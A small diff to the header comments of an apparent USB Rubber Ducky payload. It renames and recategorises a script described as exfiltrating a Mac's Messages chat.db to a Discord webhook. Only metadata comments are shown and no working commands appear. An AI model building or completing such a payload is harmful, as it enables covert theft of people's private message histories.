@@ -1,6 +1,9 @@
-REM DUCKY MAC CHAT.DB EXFILTRATION VIA DISCORD WEBHOOK
-REM For Mac OS 
-REM CREATED BY ECTO-1A
+REM Title: Mac Message DB To Discord
+REM Author: Ecto-1A
+REM Description: Exfiltrates the Messages chat.db from a Mac computer via Discord Webhook
+REM Target: Mac OS 
+REM Version 1.0
+REM Category: Exfiltration
 
 REM The chat.db is a database of all text messages sent via iMessage/Messages on the Mac.
 
